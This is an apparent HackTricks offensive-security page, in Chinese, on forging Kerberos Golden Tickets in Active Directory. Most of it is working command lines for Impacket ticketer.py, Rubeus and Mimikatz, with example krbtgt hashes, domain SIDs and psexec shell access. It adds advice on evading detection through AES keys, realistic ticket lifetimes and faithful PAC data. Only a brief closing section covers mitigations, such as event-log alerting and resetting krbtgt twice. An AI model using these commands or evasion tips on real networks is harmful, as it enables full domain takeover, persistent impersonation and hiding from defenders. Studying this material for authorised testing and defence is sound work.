# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket** 攻击是通过使用 Active Directory (AD) 的 krbtgt 账户的 **NTLM hash**，**创建一个冒充任意用户的合法 Ticket Granting Ticket (TGT)**。这种技术尤其有优势，因为它**允许以被冒充的用户身份访问域内的任何服务或机器**。必须记住，**krbtgt 账户的凭据不会自动更新**。

要**获取 krbtgt 账户的 NTLM hash**，可以采用多种方法。它可以从 **Local Security Authority Subsystem Service (LSASS) 进程**或域内任意 Domain Controller (DC) 上的 **NT Directory Services (NTDS.dit) 文件**中提取。此外，**执行 DCsync attack** 也是获取该 NTLM hash 的另一种策略，可使用诸如 Mimikatz 中的 **lsadump::dcsync module** 或 Impacket 的 **secretsdump.py script** 等工具来完成。需要强调的是，要执行这些操作，**通常需要 domain admin 权限或类似级别的访问权限**。

虽然 NTLM hash 是一种可行的方法，但出于操作安全原因，**强烈建议**使用 **Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** 来伪造 tickets。这在现代域中更加重要，因为 **RC4 的使用正在被逐步淘汰**，并且在 Kerberos telemetry 中会更加明显。
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### 现代 ticket 制作说明

在可能的情况下，**先查询 LDAP 和 SYSVOL**，然后使用真实的 domain policy 和 user PAC values 来伪造 ticket，而不是手动编造它们：
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` 向 DC 请求用于构建更真实 PAC 的用户、组、NetBIOS 和 policy 数据。
- `/printcmd` 输出一个包含已检索 PAC 字段的离线命令行；如果你之后想在不再次访问 LDAP 的情况下伪造同一张 ticket，这会很有用。
- `/extendedupndns` 添加较新的 `UpnDns` PAC 元素，其中包含 `samAccountName` 和 account SID。
- `/oldpac` 移除较新的 `Requestor` 和 `Attributes` PAC buffers；这主要用于针对旧环境的兼容性测试，而不是默认 tradecraft。

在 Linux 上，较新的 Impacket versions 也支持添加较新的 PAC structures 并设置一个 realistic validity period：
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` 以 **小时** 为单位。默认值是 **10年**，这会很显眼。
- `-extra-pac` 会添加较新的 `UPN_DNS` PAC 信息。
- `-old-pac` 会强制使用旧版 PAC 布局。
- `-extra-sid` 在 PAC 需要额外 SIDs 时很有用（例如，在子到父提权场景中，这些内容在 [SID-History Injection](sid-history-injection.md) 中有介绍）。

**一旦**你注入了 **golden Ticket**，就可以访问共享文件 **(C$)**，并执行 services 和 WMI，因此你可以使用 **psexec** 或 **wmiexec** 获取 shell（看起来你无法通过 winrm 获取 shell）。

### 绕过常见检测

检测 golden ticket 最常见的方法是通过**检查网络上的 Kerberos 流量**。默认情况下，Mimikatz 会将 **TGT 签名为 10年**，这在随后使用它发起的 TGS 请求中会显得异常。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

使用 `/startoffset`、`/endin` 和 `/renewmax` 参数来控制开始偏移、持续时间以及最大续期次数（全部以分钟为单位）。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
不幸的是，TGT 的生命周期不会记录在 4769 中，所以你不会在 Windows event logs 里找到这个信息。不过，你可以关联的是**看到 4769 但之前没有 4768**。**没有 TGT 就不可能请求 TGS**，如果没有 TGT 被签发的记录，我们可以推断它是离线伪造的。

在**较新的 Windows builds** 中，Event IDs **4768** 和 **4769** 也会暴露更好的**encryption type telemetry**。在 `krbtgt`、clients 和 services 已经有 AES keys 的域里，使用 **RC4 (`0x17`)** 伪造的 TGT/TGS，比几年前更容易被发现。这也是为什么更推荐使用**AES-backed Golden Tickets**，并尽可能让它与域的正常 Kerberos policy 保持一致。

另一个 OPSEC 问题是 **PAC fidelity**。包含不可能的 group memberships、缺少较新的 PAC buffers，或者与 LDAP 不一致的 account metadata 的 tickets，在 defenders 将 PAC contents 与 AD data 进行验证时，更容易被检测出来。如果你需要一个看起来像是由 DC 真正签发的 TGT，请查看：

{{#ref}}
diamond-ticket.md
{{#endref}}

持久化还存在一些**环境限制**。`krbtgt` account 保留了 **2 次 password history**，因此如果 forged TGT 是用前一个 key 签名的，它可以在 **第一次** `krbtgt` reset 后仍然有效。这就是为什么 defenders 会通过**重置 `krbtgt` 两次**，并在两次重置之间至少等待该域的最大 ticket lifetime，来使 Golden Tickets 失效。

为了**绕过这个检测**，请查看 diamond tickets。

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

defenders 还能做的一些小技巧是：**对敏感用户的 4769 进行告警**，例如默认的 domain administrator account，并在通常签发 AES tickets 的域中，对 **krbtgt 的 RC4 使用**进行告警。

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
